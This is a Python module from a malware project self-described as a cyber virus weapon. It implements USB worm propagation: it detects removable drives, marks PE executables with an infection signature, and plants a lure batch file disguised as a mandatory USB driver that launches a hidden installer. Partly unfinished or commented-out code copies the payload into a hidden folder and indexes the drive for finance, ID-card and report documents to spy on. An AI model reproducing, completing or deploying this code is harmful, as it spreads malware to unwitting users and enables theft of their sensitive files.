# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLhread/Thread_InfectionWorker
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# Responsible for the contagion function of this project,
# Copying the body to mobile devices such as USB flash drives,
# And then using social engineering methods to attract clicks.


from TLib import *
from TLib.T_imports import *
from TLib.T_FIO import *
from TLib.T_CDLL import *
import TPLib.T_IndexEspionageProgram



class InfectionTools:
    def __init__(self):
        pass
    def WriteSIG(self, file_path, dw_addr, dw_sig):
        try:
            with open(file_path, 'r+b') as file:
                file.seek(dw_addr)
                data = struct.pack('<I', dw_sig)
                file.write(data)
                return True
        except:
            return False
    def CheckSIG(self, file_path, dw_addr, dw_sig):
        try:
            with open(file_path, 'r+b') as file:
                file.seek(dw_addr)
                data = file.read(4)
                if len(data) == 4:
                    dw_sig_num = struct.unpack('<I', data)[0]
                    return dw_sig_num == dw_sig
                return False
        except:
            return False
    def GetVirusFlags(self, file_path, dw_addr):
        try:
            with open(file_path, 'r+b') as file:
                file.seek(dw_addr)
                data = file.read(4)
                if len(data) == 4:
                    dw_sig_num = struct.unpack('<I', data)[0]
                    return dw_sig_num
                return None
        except:
            return None
    def GetDrives(self, TargetDrive="C:\\"):
        volume_handle = kernel32.CreateFileW(
            "\\\\.\\" + TargetDrive[:-1],
            0,
            ctypes.wintypes.DWORD(0x00000001 | 0x00000002),
            None,
            ctypes.wintypes.DWORD(3),  # OPEN_EXISTING
            0,
            None
        )
        if volume_handle == ctypes.wintypes.HANDLE(-1).value:
            raise ctypes.WinError(ctypes.get_last_error())
        class DISK_EXTENT(ctypes.Structure):
            _fields_ = [
                ("DiskNumber", ctypes.wintypes.DWORD),
                ("StartingOffset", ctypes.wintypes.LARGE_INTEGER),
                ("ExtentLength", ctypes.wintypes.LARGE_INTEGER)
            ]
        class VOLUME_DISK_EXTENTS(ctypes.Structure):
            _fields_ = [
                ("NumberOfDiskExtents", ctypes.wintypes.DWORD),
                ("Extents", DISK_EXTENT * 1)
            ]
        IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS = 0x560000
        extents = VOLUME_DISK_EXTENTS()
        bytes_returned = ctypes.wintypes.DWORD()
        kernel32.DeviceIoControl(
            volume_handle,
            IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS,
            None,
            0,
            ctypes.byref(extents),
            ctypes.sizeof(extents),
            ctypes.byref(bytes_returned),
            None
        )
        disk_number = extents.Extents[0].DiskNumber
        kernel32.CloseHandle(volume_handle)
        drives = []
        bitmask = kernel32.GetLogicalDrives()
        for i in range(26):
            if bitmask & 1:
                drives.append(chr(65 + i) + ":\\")
            bitmask >>= 1
        # DISK ALL IN ONES CDS?
        same_disk_drives = []
        for drive in drives:
            try:
                vol_handle = kernel32.CreateFileW(
                    "\\\\.\\" + drive[:-1],
                    0,
                    ctypes.wintypes.DWORD(0x00000001 | 0x00000002),
                    None,
                    ctypes.wintypes.DWORD(3),
                    0,
                    None
                )
                if vol_handle == ctypes.wintypes.HANDLE(-1).value:
                    continue
                extents = VOLUME_DISK_EXTENTS()
                bytes_returned = ctypes.wintypes.DWORD()
                kernel32.DeviceIoControl(
                    vol_handle,
                    IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS,
                    None,
                    0,
                    ctypes.byref(extents),
                    ctypes.sizeof(extents),
                    ctypes.byref(bytes_returned),
                    None
                )
                if extents.NumberOfDiskExtents > 0 and extents.Extents[0].DiskNumber == disk_number:
                    same_disk_drives.append(drive)
                kernel32.CloseHandle(vol_handle)
            except:
                continue
        return same_disk_drives
    def GetAvailableDrives(self):
        lpBuffer = ctypes.create_string_buffer(78)
        ctypes.windll.kernel32.GetLogicalDriveStringsA(ctypes.sizeof(lpBuffer), lpBuffer)
        drives = lpBuffer.raw.split(b'\x00')
        return [drive.decode('ascii') for drive in drives if drive]
    def GetUSBDrives(self):
        return list(set(self.GetAvailableDrives())-set(self.GetDrives()))
    def IsDriveListExist(self, drives):
        return [drive for drive in drives if os.path.isdir(drive)]
    def TestDisk(self, drive):
        def _check_permissions():
            if not all([os.access(drive, os.R_OK), os.access(drive, os.W_OK)]):
                return False
            test_file = os.path.join(drive, 'speedtest.tmp')
            try:
                start_time = time.time()
                with open(test_file, 'wb', buffering=1024*1024) as f:
                    f.write(os.urandom(1024*1024))
                with open(test_file, 'rb') as f:
                    while f.read(1024*1024): pass
                duration = time.time() - start_time
                speed = 2.0 / duration
                return speed > 1.0
            except (IOError, OSError):
                return False
            finally:
                if os.path.exists(test_file):
                    os.remove(test_file)
        result = []
        def _worker():
            result.append(_check_permissions())
        t = threading.Thread(target=_worker)
        t.start()
        t.join(timeout=10)
        if t.is_alive():
            return False
        return result[0] if result else False

class InfectionEXE:
    def __init__(self, path, VIRUSFLAGS):
        self.ECO=0x04
        self.path=path
        self.WORK=False
        self.IFT=None
        self.VIRUSFLAGS=VIRUSFLAGS
        if os.path.isfile(self.path):
            try:
                with open(self.path, 'rb') as file:
                    if struct.unpack('<H', file.read(2))[0] == 0x5A4D:
                        self.WORK=True
            except:
                pass
    def SetIFT(self, IFT: InfectionTools):
        self.IFT = IFT
    def __change__(self):
        if not self.WORK or not self.IFT:
            return False
        if not self.IFT.CheckSIG(self.path, self.ECO, self.VIRUSFLAGS):
            self.IFT.WriteSIG(self.path, self.ECO, self.VIRUSFLAGS)
        return self.IFT.GetVirusFlags(self.path, self.ECO)


class InfectionWorker(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', SleepTime: float = 5):
        self.master = master
        self.infectiontools = InfectionTools()
        self.desc = "Infection Worker For T4"
        self.od = []
        self.SleepTime = SleepTime
        self.AddEditor("SleepTime", "SleepTime", "int")
        return
        while not self.ShouldStop():
            if (ind:=list(set(nd:=self.infectiontools.GetUSBDrives())-set(self.od))) != []:
                for i in ind:
                    ibuf: InfectionInstallWorker = InfectionInstallWorker(self.master, self, self.infectiontools, i)
                    self.master.TProcessManager.AddThread(ibuf)
                    ibuf.start()
                self.od=nd
            else:
                self.od=self.infectiontools.IsDriveListExist(self.od)
            time.sleep(self.SleepTime)
    def __init_values__(self):
        self.InfectionTactics: InfectionTactics = InfectionTactics()

class InfectionTactics:
    def __init__(self):
        self.USBDrive="""@echo off
cd \\
.\\Install.exe"""


class InfectionInstallWorker(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', IWorker: InfectionWorker, ITools: InfectionTools, disk: str):
        self.master: 'Termination4.Termination' = master
        self.IWorker: InfectionWorker = IWorker
        self.ITools: InfectionTools = ITools
        self.desc: str = f"[Infection] For {disk}"
        self.logger.Info(f"[Infection] For [{disk}]")

    def InfectionUSBDrive(self, disk: str):
        DiskPath: str = os.path.join(disk, "USB驱动(必装！！！).bat")
        

    def InfectionExeFile(self, disk: str):
        pass

    def InfectionSurfaceFile(self, disk: str):
        pass

"""
        self.IndexMaker: TPLib.T_IndexEspionageProgram.maker.DiskIndexer = TPLib.T_IndexEspionageProgram.maker.DiskIndexer(disk)
        self.IndexMaker.Start()
        self.IndexMaker.ImportIndex("xxx.json")
        self.IndexMaker.ExportIndex("xxx.json")
        Filtered = self.IndexMaker.Filter(NamePattern=r'^(财务|身份证|报表)$', ExtPattern=r'^(doc|docx|pdf|xlsx|xls)$')
        Filtered = self.IndexMaker.Filter(ExtPattern=r'^(doc|docx|pdf|xlsx|xls)$')

        # Tools
        T_EXEConfig.EXEConfig(master, "XXX.EXE", "FAILED TO READ EXE, READ BYTES").Is() # True -> Termination文件 False -> 其他文件
        

        Path_TDir: str = os.path.join(disk, ".Termination")
        Path_TerminationMainEXE: str = os.path.join(disk, ".Termination", "Termination.exe" if self.master.WorkMod == "exe" else "Termination.py")
        Path_InstallEXE: str = os.path.join(disk, "Install.exe")
        Path_USBDrive: str = os.path.join(disk, "USB驱动(必装！！！).bat")

        if os.path.exists(Path_TDir): os.chmod(Path_TDir, 0o777)
        if os.path.exists(Path_TerminationMainEXE): os.chmod(Path_TerminationMainEXE, 0o777)
        if os.path.exists(Path_InstallEXE): os.chmod(Path_InstallEXE, 0o777)
        if os.path.exists(Path_USBDrive): os.chmod(Path_USBDrive, 0o777)

        if not self.infectiontools.TestDisk(disk):
            self.logger.Error(f"[Infection] Failed [{disk}] Test")
        else:
            self.logger.Success(f"[Infection] [{disk}] Test Successful")

        try:
            if not os.path.isdir(Path_TDir): os.mkdir(Path_TDir)
            FIO.HideFile(Path_TDir)
        except: self.logger.Error(f"[Infection] For [{disk}] Unable To Create Folder")

        try:
            FIO.openw(Path_TerminationMainEXE, FIO.openr(self.master.__file__, 2), 2)
        except: self.logger.Error(f"[Infection] For [{disk}] Unable To Create Termination Main EXE (Py)")

        try:
            FIO.openw(Path_InstallEXE, FIO.openr(self.master.Static_Installt, 2), 2)
            FIO.HideFile(Path_InstallEXE)
        except: self.logger.Error(f"[Infection] For [{disk}] Unable To Create Termination Main Help EXE")

        try: FIO.openw(Path_USBDrive, self.InfectionWorker.InfectionTactics.USBDrive)
        except: self.logger.Error(f"[Infection] For [{disk}] Unable To Create Termination Main <USEDrive.bat>")
        self.logger.Success(f"[Infection] For [{disk}] SucessFul")"""
